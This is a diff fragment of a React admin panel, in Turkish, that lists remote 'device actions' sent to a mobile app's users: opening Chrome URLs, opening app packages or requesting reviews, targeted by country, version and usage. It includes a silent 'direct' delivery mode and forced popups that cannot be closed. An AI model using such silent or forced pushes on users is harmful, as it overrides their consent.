+                        <span>{directText}</span>
+                        {daActionType !== "review_sheet" && daValue && <code>{daValue}</code>}
+                      </div>
+                    )}
                   </div>
                 </div>
-                );
-              })}
+                <div className="da-chips">
+                  {[amLabel(daAppMode), ccSummary, daShowOnce ? "Bir kez" : "Her açılışta", Number(daMinLaunches) > 0 ? `${daMinLaunches}+ kullanım` : "Kullanım şartı yok", verSummary].map(x => <span key={x}>{x}</span>)}
+                </div>
+                <div className="da-match">
+                  <b>{match == null ? "—" : `≈ ${match}`}</b>
+                  <span>cihaz şu an hedefe uyuyor<br /><small>son 5 dk · sürüm ve kullanım şartı hesaba katılmaz</small></span>
+                </div>
+                <button style={{ ...styles.primaryBtn, width: "100%" }} onClick={createDeviceAction}>Gönder</button>
+              </div>
             </div>
-          )}
-        </div>}
+
+            {/* Geçmiş — tek satır; tıklayınca ayrıntı */}
+            {deviceActions.length > 0 && (
+              <div style={{ marginTop: 26 }}>
+                <h3 style={{ color: "#f4f4f6", fontSize: 14, margin: "0 0 10px" }}>Geçmiş</h3>
+                <div className="da-hist">
+                  {deviceActions.map(action => {
+                    const am = action.appMode || "youtube";
+                    const cList = Array.isArray(action.countries) ? action.countries : [];
+                    const cMode = action.countryMode || "all";
+                    const countryText = cMode === "all" || cList.length === 0
+                      ? "🌍 Tüm ülkeler"
+                      : (cMode === "exclude" ? "🚫 Hariç: " : "✅ Sadece: ") + cList.map(c => `${countryFlag(c)} ${countryName(c)}`).join(", ");
+                    const ccShort = cMode === "all" || cList.length === 0 ? "Tüm ülkeler"
+                      : (cMode === "exclude" ? "Hariç " : "") + cList.slice(0, 3).join(", ") + (cList.length > 3 ? ` +${cList.length - 3}` : "");
+                    const verText = !action.minVersion && !action.maxVersion
+                      ? "Tüm sürümler"
+                      : `${action.minVersion || "—"} → ${action.maxVersion || "—"}`;
+                    const created = action.createdAt
+                      ? new Date(action.createdAt).toLocaleString("tr-TR", { day: "2-digit", month: "long", year: "numeric", hour: "2-digit", minute: "2-digit" })
+                      : "—";
+                    const typeText = action.actionType === "chrome_url" ? "🌐 Chrome URL"
+                      : action.actionType === "package_name" ? "📦 Package Name" : "⭐ Review Sheet";
+                    const details = [
+                      ["Komut", typeText],
+                      ["Gönderim", action.mode === "direct" ? "⚡ Direct (Sessiz)" : "💬 Popup (Onaylı)"],
+                      ["Uygulama modu", am === "ringtone" ? "🔔 Zil Sesi Modu" : am === "both" ? "🌐 Her İkisi" : "▶️ YouTube Modu"],
+                      ["Sıklık", action.showOnce === false ? "🔁 Her açılışta" : "1️⃣ Tek seferlik"],
+                      ["Kullanım şartı", action.minLaunches > 0 ? `🔢 En az ${action.minLaunches} kullanım` : "Şart yok"],
+                      ["Sürüm (versionCode)", verText],
+                      ["Ülkeler", countryText],
+                    ];
+                    if (action.mode === "popup") {
+                      details.push(["Popup mesajı", action.label || "Varsayılan"]);
+                      details.push(["Butonlar", `✅ ${action.confirmText || "Varsayılan"}${action.forceAction ? "" : ` · ✖️ ${action.cancelText || "Varsayılan"}`}`]);
+                      details.push(["Zorunlu", action.forceAction ? "🔒 Evet, kapatılamaz" : "Hayır"]);
+                    }
+                    const open = daOpenId === action.id;
+                    const t = typeOpts.find(x => x.key === action.actionType) || typeOpts[2];
+                    return (
+                      <div key={action.id} className={"da-hr" + (action.active ? " act" : "")}>
+                        <div className="da-hr-main" onClick={() => setDaOpenId(open ? null : action.id)}>
+                          <span className={"da-pill" + (action.active ? " on" : "")}>{action.active ? "Aktif" : "Pasif"}</span>
+                          {ico(t.icon, "da-hr-i")}
+                          <span className="da-hr-v">{action.actionType === "review_sheet" ? "Puan iste" : action.value}</span>
+                          <span className="da-tag">{amLabel(am)}</span>
+                          <span className="da-tag">{ccShort}</span>
+                          <span className="da-cnt">{action.executedCount || 0} kez</span>
+                          <span className="da-acts" onClick={e => e.stopPropagation()}>
+                            {action.active && <button type="button" onClick={() => deactivateDeviceAction(action.id)} className="da-b warn">Durdur</button>}
+                            <button type="button" onClick={() => deleteDeviceAction(action.id)} className="da-b">Sil</button>
+                          </span>
+                          <svg className={"pn-chev" + (open ? " open" : "")} viewBox="0 0 24 24"><path d="m6 9 6 6 6-6" /></svg>
+                        </div>
+                        {open && (
+                          <div className="da-det">
+                            {details.map(([k, v]) => (
+                              <div key={k} style={{ gridColumn: k === "Ülkeler" ? "1 / -1" : undefined }}>
+                                <small>{k}</small><div>{v}</div>
+                              </div>
+                            ))}
+                            <div style={{ gridColumn: "1 / -1", color: "#6b6b76", fontFamily: "monospace", fontSize: 11 }}>📅 {created} · ID: {action.id}</div>
+                          </div>
+                        )}
+                      </div>
+                    );
+                  })}
+                </div>
+              </div>
+            )}
+          </div>
+          );
+        })()}
 
         {/* APP CONTROLS */}
         {activeSection === "appcontrols" && <div style={styles.card}>
